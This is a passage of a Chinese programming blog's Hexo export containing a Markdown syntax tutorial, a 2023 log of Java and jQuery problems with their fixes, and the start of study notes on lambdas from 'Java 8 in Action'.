<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>
<p>第一项</p>
<blockquote>
<p>菜鸟教程<br>
学的不仅是技术更是梦想</p>
</blockquote>
</li>
<li>
<p>第二项</p>
</li>
</ul>
<h1>段落中代码</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">用 <span class="token code-snippet code keyword">`代码内容`</span> 包裹一段代码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>用 <code>代码内容</code> 包裹一段代码</p>
<h1>代码区块</h1>
<pre class="line-numbers language-none"><code class="language-none">用 ``` 包裹一段代码。可以指定一种语言<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>举例如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'RUNOOB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1>链接</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token list punctuation">1.</span> <span class="token url">[<span class="token content">链接名称</span>](<span class="token url">链接地址</span>)</span>  ：<span class="token url">[<span class="token content">百度</span>](<span class="token url">www.baidu.com</span>)</span>
<span class="token list punctuation">2.</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>链接地址</span><span class="token punctuation">&gt;</span></span>  ：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>www.baidu.com</span><span class="token punctuation">&gt;</span></span>  
<span class="token list punctuation">3.</span> 我们可以通过变量来设置一个链接，变量赋值在文档末尾进行：

这个链接用 1 作为网址变量 <span class="token url">[<span class="token content">Google</span>][<span class="token variable">1</span>]</span>。这个链接用 runoob 作为网址变量 <span class="token url">[<span class="token content">Runoob</span>][<span class="token variable">runoob</span>]</span>。下面要空一行

然后在文档的结尾为变量赋值（网址）

  <span class="token url-reference url"><span class="token punctuation">[</span><span class="token variable">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span> http://www.google.com/</span>
  <span class="token url-reference url"><span class="token punctuation">[</span><span class="token variable">runoob</span><span class="token punctuation">]</span><span class="token punctuation">:</span> http://www.runoob.com/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>
<p><a href="www.baidu.com">链接名称</a></p>
</li>
<li>
<p>&lt;<a href="http://www.baidu.com">www.baidu.com</a>&gt;</p>
</li>
<li>
<p>这个链接用 1 作为网址变量 <a href="http://www.google.com/">Google</a>。这个链接用 runoob 作为网址变量 <a href="http://www.runoob.com/">Runoob</a>。下面要空一行</p>
</li>
</ul>
<h1>文档内部锚点引用</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token title important"><span class="token punctuation">#</span> 标题</span>

<span class="token hr punctuation">----</span>
<span class="token title important"><span class="token punctuation">##</span> 目录</span>
<span class="token list punctuation">1.</span> <span class="token url">[<span class="token content">目录1</span>](<span class="token url">#jump1</span>)</span>
<span class="token list punctuation">2.</span> <span class="token url">[<span class="token content">目录2</span>](<span class="token url">#jump2</span>)</span>

<span class="token hr punctuation">---</span>
<span class="token title important">### &lt;span id="jump1"&gt;1. 目录1&lt;/span&gt;
<span class="token punctuation">---</span></span>
<span class="token title important"><span class="token punctuation">###</span> &lt;span id="jump2"&gt;2. 目录2&lt;/span&gt;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>图片</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token url"><span class="token operator">!</span>[<span class="token content">alt 属性文本</span>](<span class="token url">图片地址</span>)</span>

<span class="token url"><span class="token operator">!</span>[<span class="token content">alt 属性文本</span>](<span class="token url">图片地址</span> <span class="token string">"图片的title属性文字"</span>)</span>


开头一个感叹号 !
接着一个方括号，里面放上图片的替代文字
接着一个普通括号，里面放上图片的网址（最后还可以用引号包住并加上选择性的 'title' 属性的文字）


Markdown 还没有办法指定图片的高度与宽度，如果你需要的话，你可以使用普通的 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span><span class="token punctuation">&gt;</span></span> 标签。
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://static.runoob.com/images/runoob-logo.png<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20%<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果希望图片左对齐，左对齐很简单，<strong>单行图片的情况下在前面输入一个空格就解决了</strong>，右对齐就需要靠css了</p>
<h1>表格</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token table"><span class="token table-header-row"><span class="token punctuation">|</span><span class="token table-header important">  表头   </span><span class="token punctuation">|</span><span class="token table-header important"> 表头  </span><span class="token punctuation">|</span>
</span><span class="token table-line"><span class="token punctuation">|</span>  <span class="token punctuation">----</span>  <span class="token punctuation">|</span> <span class="token punctuation">----</span>  <span class="token punctuation">|</span>
</span><span class="token table-data-rows"><span class="token punctuation">|</span><span class="token table-data"> 单元格  </span><span class="token punctuation">|</span><span class="token table-data"> 单元格 </span><span class="token punctuation">|</span>
<span class="token punctuation">|</span><span class="token table-data"> 单元格  </span><span class="token punctuation">|</span><span class="token table-data"> 单元格 </span><span class="token punctuation">|</span>
</span></span>


对齐方式

我们可以设置表格的对齐方式：

-: 设置内容和标题栏居右对齐。
:- 设置内容和标题栏居左对齐。
:-: 设置内容和标题栏居中对齐。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th style="text-align:left">左对齐</th>
<th style="text-align:right">右对齐</th>
<th style="text-align:center">居中对齐</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">单元格</td>
<td style="text-align:right">单元格</td>
<td style="text-align:center">单元格</td>
</tr>
<tr>
<td style="text-align:left">单元格</td>
<td style="text-align:right">单元格</td>
<td style="text-align:center">单元格</td>
</tr>
</tbody>
</table>
<h1>支持的 HTML 元素</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。

目前支持的 HTML 元素有：
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>kbd</span><span class="token punctuation">&gt;</span></span> 定义键盘文本。它表示文本是从键盘上键入的
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">&gt;</span></span> 加粗
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span><span class="token punctuation">&gt;</span></span>斜体文本
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">&gt;</span></span>呈现为被强调的文本
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sup</span><span class="token punctuation">&gt;</span></span> 上标文本
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sub</span><span class="token punctuation">&gt;</span></span> 下标文本
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span> 换行
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xxx.mp4<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span> 引入视频<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这是使用 <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>Del</kbd> 重启电脑<br>
这是<b> 加粗</b><br>
这是<i>斜体文本</i><br>
这是<em>呈现为被强调的文本</em><br>
这是<sup> 上标文本</sup><br>
这是<sub> 下标文本</sub><br>
这是<br> 换行</p>
<h1>转义</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">使用反斜杠转义特殊字符
    <span class="token bold"><span class="token punctuation">**</span><span class="token content">文本加粗</span><span class="token punctuation">**</span></span> 
    \*\* 正常显示星号 \*\*

Markdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：

<span class="token code keyword">    \   反斜线
    `   反引号
    *   星号
    _   下划线
    {}  花括号
    []  方括号
    ()  小括号
    #   井字号
    +   加号
    -   减号
    .   英文句点
    !   感叹号</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>公式</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">当你需要在编辑器中插入数学公式时，可以使用两个美元符 $$ 包裹 TeX 或 LaTeX 格式的数学公式来实现<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>流程图、时序图(顺序图)、甘特图</h1>
<ol>
<li>
<p>横向流程图源码格式</p>
<pre class="line-numbers language-none"><code class="language-none">graph LR
A[方形] --&gt;B(圆角)
    B --&gt; C{条件a}
    C --&gt;|a=1| D[结果1]
    C --&gt;|a=2| E[结果2]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="mermaid">   graph LR
A[方形] --&gt;B(圆角)
    B --&gt; C{条件a}
    C --&gt;|a=1| D[结果1]
    C --&gt;|a=2| E[结果2]</pre>
</li>
<li>
<p>竖向流程图源码格式：</p>
<pre class="line-numbers language-none"><code class="language-none">graph TD
A[方形] --&gt; B(圆角)
    B --&gt; C{条件a}
    C --&gt; |a=1| D[结果1]
    C --&gt; |a=2| E[结果2]
    F[竖向流程图]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>效果：</p>
<pre class="mermaid">   graph TD
A[方形] --&gt; B(圆角)
    B --&gt; C{条件a}
    C --&gt; |a=1| D[结果1]
    C --&gt; |a=2| E[结果2]
    F[竖向流程图]</pre>
</li>
<li>
<p>标准流程图源码格式：</p>
<pre class="line-numbers language-none"><code class="language-none">st=&gt;start: 开始框
op=&gt;operation: 处理框
cond=&gt;condition: 判断框(是或否?)
sub1=&gt;subroutine: 子流程
io=&gt;inputoutput: 输入输出框
e=&gt;end: 结束框
st-&gt;op-&gt;cond
cond(yes)-&gt;io-&gt;e
cond(no)-&gt;sub1(right)-&gt;op<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>效果：</p>
<pre class="line-numbers language-flow" data-language="flow"><code class="language-flow">st<span class="token operator">=&gt;</span>start<span class="token operator">:</span> 开始框
op<span class="token operator">=&gt;</span>operation<span class="token operator">:</span> 处理框
cond<span class="token operator">=&gt;</span>condition<span class="token operator">:</span> <span class="token function">判断框</span><span class="token punctuation">(</span>是或否<span class="token operator">?</span><span class="token punctuation">)</span>
sub1<span class="token operator">=&gt;</span>subroutine<span class="token operator">:</span> 子流程
io<span class="token operator">=&gt;</span>inputoutput<span class="token operator">:</span> 输入输出框
e<span class="token operator">=&gt;</span>end<span class="token operator">:</span> 结束框
st<span class="token operator">-</span><span class="token operator">&gt;</span>op<span class="token operator">-</span><span class="token operator">&gt;</span>cond
<span class="token function">cond</span><span class="token punctuation">(</span>yes<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span>io<span class="token operator">-</span><span class="token operator">&gt;</span>e
<span class="token function">cond</span><span class="token punctuation">(</span>no<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">sub1</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span>op
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>标准流程图源码格式（横向）：</p>
<pre class="line-numbers language-none"><code class="language-none">st=&gt;start: 开始框
op=&gt;operation: 处理框
cond=&gt;condition: 判断框(是或否?)
sub1=&gt;subroutine: 子流程
io=&gt;inputoutput: 输入输出框
e=&gt;end: 结束框
st(right)-&gt;op(right)-&gt;cond
cond(yes)-&gt;io(bottom)-&gt;e
cond(no)-&gt;sub1(right)-&gt;op<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-flow" data-language="flow"><code class="language-flow">st<span class="token operator">=&gt;</span>start<span class="token operator">:</span> 开始框
op<span class="token operator">=&gt;</span>operation<span class="token operator">:</span> 处理框
cond<span class="token operator">=&gt;</span>condition<span class="token operator">:</span> <span class="token function">判断框</span><span class="token punctuation">(</span>是或否<span class="token operator">?</span><span class="token punctuation">)</span>
sub1<span class="token operator">=&gt;</span>subroutine<span class="token operator">:</span> 子流程
io<span class="token operator">=&gt;</span>inputoutput<span class="token operator">:</span> 输入输出框
e<span class="token operator">=&gt;</span>end<span class="token operator">:</span> 结束框
<span class="token function">st</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">op</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span>cond
<span class="token function">cond</span><span class="token punctuation">(</span>yes<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">io</span><span class="token punctuation">(</span>bottom<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span>e
<span class="token function">cond</span><span class="token punctuation">(</span>no<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">sub1</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span>op<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>UML时序图源码样例：</p>
<pre class="line-numbers language-none"><code class="language-none">对象A-&gt;对象B: 对象B你好吗?（请求）
Note right of 对象B: 对象B的描述
Note left of 对象A: 对象A的描述(提示)
对象B--&gt;对象A: 我很好(响应)
对象A-&gt;对象B: 你真的好吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-sequence" data-language="sequence"><code class="language-sequence">对象A-&gt;对象B: 对象B你好吗?（请求）
Note right of 对象B: 对象B的描述
Note left of 对象A: 对象A的描述(提示)
对象B--&gt;对象A: 我很好(响应)
对象A-&gt;对象B: 你真的好吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>6、UML时序图源码复杂样例：</p>
<pre class="line-numbers language-none"><code class="language-none">Title: 标题：复杂使用
对象A-&gt;对象B: 对象B你好吗?（请求）
Note right of 对象B: 对象B的描述
Note left of 对象A: 对象A的描述(提示)
对象B--&gt;对象A: 我很好(响应)
对象B-&gt;小三: 你好吗
小三--&gt;&gt;对象A: 对象B找我了
对象A-&gt;对象B: 你真的好吗？
Note over 小三,对象B: 我们是朋友
participant C
Note right of C: 没人陪我玩<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-sequence" data-language="sequence"><code class="language-sequence">Title: 标题：复杂使用
对象A-&gt;对象B: 对象B你好吗?（请求）
Note right of 对象B: 对象B的描述
Note left of 对象A: 对象A的描述(提示)
对象B--&gt;对象A: 我很好(响应)
对象B-&gt;小三: 你好吗
小三--&gt;&gt;对象A: 对象B找我了
对象A-&gt;对象B: 你真的好吗？
Note over 小三,对象B: 我们是朋友
participant C
Note right of C: 没人陪我玩<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>7、UML标准时序图样例：</p>
<pre class="line-numbers language-none"><code class="language-none">%% 时序图例子,-&gt; 直线，-&gt;&gt;实线箭头，--&gt;虚线，--&gt;&gt;虚线箭头
  sequenceDiagram
    participant 张三
    participant 李四
    张三-&gt;王五: 王五你好吗？
    loop 健康检查
        王五-&gt;王五: 与疾病战斗
    end
    Note right of 王五: 合理 食物 &lt;br/&gt;看医生...
    李四--&gt;&gt;张三: 很好!
    王五-&gt;李四: 你怎么样?
    李四--&gt;王五: 很好!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="mermaid">   %% 时序图例子,-&gt; 直线，-&gt;&gt;实线箭头，--&gt;虚线，--&gt;&gt;虚线箭头
  sequenceDiagram
    participant 张三
    participant 李四
    张三-&gt;王五: 王五你好吗？
    loop 健康检查
        王五-&gt;王五: 与疾病战斗
    end
    Note right of 王五: 合理 食物 <br>看医生...
    李四--&gt;&gt;张三: 很好!
    王五-&gt;李四: 你怎么样?
    李四--&gt;王五: 很好!</pre>
<p>8、甘特图样例：</p>
<pre class="line-numbers language-none"><code class="language-none">%% 语法示例
  gantt
  dateFormat  YYYY-MM-DD
  title 软件开发甘特图
  section 设计
  需求:done, des1, 2014-01-06,2014-01-08
  原型 :active,  des2, 2014-01-09, 3d
  UI设计:des3, after des2, 5d
未来任务:des4, after des3, 5d
  section 开发
  学习准备理解需求 :crit, done, 2014-01-06,24h
  设计框架  :crit, done, after des2, 2d
  开发:crit, active, 3d
  未来任务:crit, 5d
  耍  :2d
  section 测试
  功能测试:active, a1, after des3, 3d
  压力测试 :after a1  , 20h
  测试报告 : 48h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="mermaid">   %% 语法示例
  gantt
  dateFormat  YYYY-MM-DD
  title 软件开发甘特图
  section 设计
  需求:done, des1, 2014-01-06,2014-01-08
  原型 :active,  des2, 2014-01-09, 3d
  UI设计:des3, after des2, 5d
未来任务:des4, after des3, 5d
  section 开发
  学习准备理解需求 :crit, done, 2014-01-06,24h
  设计框架  :crit, done, after des2, 2d
  开发:crit, active, 3d
  未来任务:crit, 5d
  耍  :2d
  section 测试
  功能测试:active, a1, after des3, 3d
  压力测试 :after a1  , 20h
  测试报告 : 48h</pre>
</li>
</ol>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>2023年问题记录</title>
    <url>/20230223/65e80ab3.html</url>
    <content><![CDATA[<h1>response.sendRedirect丢失请求地址的HTTPS协议</h1>
<ul>
<li>
<p>问题描述：</p>
<p><code>response.sendRedirect</code> 默认采用的HTTP协议GET请求，导致在重定向之后，原先的HTTPS请求变为HTTP请求</p>
</li>
<li>
<p>解决</p>
<ol>
<li>
<p>在响应信息中设置<code>HTTP状态码</code>和<code>location</code>头信息</p>
<p>当状态码为302时，表明资源位置临时发生了改变，需要进行重定向，location头信息标识了资源转向的位置，该地址写相对地址</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">response<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token class-name">HttpHeaders</span><span class="token punctuation">.</span><span class="token constant">LOCATION</span><span class="token punctuation">,</span> consultUser<span class="token punctuation">.</span><span class="token function">getSession_path</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/dept_sub_consult/source/notice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>使用转发</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span>consultUser<span class="token punctuation">.</span><span class="token function">getSession_path</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/intermediate/list"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
</li>
</ul>
<h1>JUnit测试提示Java.lang.Exception: No runnable methods</h1>
<ul>
<li>
<p>问题描述：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230315103150697.png" alt="image-20230315103150697"></p>
</li>
<li>
<p>解决</p>
<p>@Test导入的包错了，spring-test 需要的Junit是org.junit.Test，但是在@Test有两个包，另一个是org.junit.jupiter.api.Test，</p>
</li>
</ul>
<h1>jquery – 在SPAN元素上禁用设置属性不会阻止点击事件</h1>
<p>来源：<a href="https://www.jb51.cc/jquery/182333.html">https://www.jb51.cc/jquery/182333.html</a></p>
<p>一个SPAN元素，在点击事件上做某事。当我禁用它，使用jQuery：<code>$(“span”).attr(“disabled”，true)</code> 无效</p>
<h3 id="解决方法">解决方法</h3>
<p>尝试这个：</p>
<pre class="line-numbers language-none"><code class="language-none">$("span").css("pointer-events","none");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>你可以启用这些</p>
<pre class="line-numbers language-none"><code class="language-none">$("span").css("pointer-events","auto");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>点滴</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 8 in Action【汪文君】</title>
    <url>/20221022/725f0c76.html</url>
    <content><![CDATA[<p>源码： <a href="https://github.com/java8/Java8InAction">Java8 In Action</a><br>
笔记来源：<a href="https://waltyou.github.io">https://waltyou.github.io</a></p>
<h1>全书脑图</h1>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/Java8-In-Action-16376831319681.png" alt=" Java 8 in Action"></p>
<span id="more"></span>
<h1>梳理脉络</h1>
<p>通过脑图可以看出，全书分为四个部分：</p>
<ol>
<li>
<p>基础知识，重点是为何关心java8，行为参数化和lambda</p>
</li>
<li>
<p>函数式编程，重点是全面系统的介绍Stream</p>
</li>
<li>
<p>Java8的其他改善点</p>
<ul>
<li>重构/测试/调试</li>
<li>默认方法（Default Function）</li>
<li>Optional替代null</li>
<li>CompletableFuture 组合式异步编程</li>
<li>日期时间API</li>
</ul>
</li>
<li>
<p>Java8之上：对函数式编程的思考，函数编程的技巧，与Scala的比较</p>
</li>
</ol>
<h1>行为参数化</h1>
<ol>
<li>Why<br>
应对不断变化的需求，避免啰嗦，而且不打破DRY（Don’t Repeat Yourself）规则。</li>
<li>What<br>
简单讲：把方法（你的代码）作为参数传递给另一个方法。<br>
复杂讲： 让方法接受多种行为（或战略）作为参数，并在内部使用，来完成不同的行为。</li>
<li>How<br>
Example：用一个Comparator排序Apple，使用Java 8中List默认的sort方法。</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// java.util.Comparator</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">T</span> o1<span class="token punctuation">,</span> <span class="token class-name">T</span> o2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 匿名类写法</span>
inventory<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Apple</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Apple</span> a1<span class="token punctuation">,</span> <span class="token class-name">Apple</span> a2<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> a1<span class="token punctuation">.</span><span class="token function">getWeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>a2<span class="token punctuation">.</span><span class="token function">getWeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// lambda写法</span>
inventory<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>
    <span class="token punctuation">(</span><span class="token class-name">Apple</span> a1<span class="token punctuation">,</span> <span class="token class-name">Apple</span> a2<span class="token punctuation">)</span> <span class="token operator">-&gt;</span>
    a1<span class="token punctuation">.</span><span class="token function">getWeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>a2<span class="token punctuation">.</span><span class="token function">getWeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>匿名函数lambda</h1>
<p>使用lambda之前，需要了解两个概念：<strong>函数式接口 <strong>和</strong>函数描述符</strong></p>
<h2 id="1-函数式接口">1. 函数式接口</h2>
<p>定义：只定义一个抽象方法的接口<br>
<code>@FunctionalInterface</code>：标注用于表示该接口会设计成一个函数式接口。<br>
Java 8 提供了一些新的函数式接口， 位置：java.util.function</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220502170433104.png" alt="image-20220502170433104"></p>
<h2 id="2-函数描述符">2. 函数描述符</h2>
<p>函数式接口的抽象方法的签名基本上就是Lambda表达式的签名。如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token keyword">void</span>
<span class="token punctuation">(</span><span class="token class-name">Apple</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token keyword">int</span>
<span class="token punctuation">(</span><span class="token class-name">Apple</span><span class="token punctuation">,</span> <span class="token class-name">Apple</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token keyword">boolean</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="3-实现细节">3. 实现细节</h2>
<h3 id="类型检查">类型检查</h3>
<p>上下文中Lambda表达式需要的类型称为目标类型</p>
<ol>
<li>同样的Lambda，不同的函数式接口</li>
<li>特殊的void兼容规则：如果一个Lambda的主体是一个语句表达式 它就和一个返回void的函数描述符兼容。</li>
</ol>
<h3 id="类型推断">类型推断</h3>
<p>编译器可以了解Lambda表达式的参数类型，这样就可以在Lambda语法中省去标注参数类型。</p>
<h3 id="使用局部变量">使用局部变量</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> portNumber <span class="token operator">=</span> <span class="token number">1337</span><span class="token punctuation">;</span> 
<span class="token class-name">Runnable</span> r <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>portNumber<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>注意： Lambda可以没有限制地捕获（也就是在其主体中引用）实例变量和静态变量。但局部变量必须显式声明为final，或事实上是final。</p>
<p>原因：<br>
1）局部变量保存在栈上，并且隐式表示它们仅限于其所在线程，如果允许捕获可改变的局部变量，就会引发造成线程不安全新的可能性；<br>
2）不鼓励你使用改变外部变量的典型命令式编程模式</p>
<h3 id="方法引用（method-reference）">方法引用（method reference）</h3>
<p>目标引用放在分隔符<code>::</code>前, 方法的名称放在后面。</p>
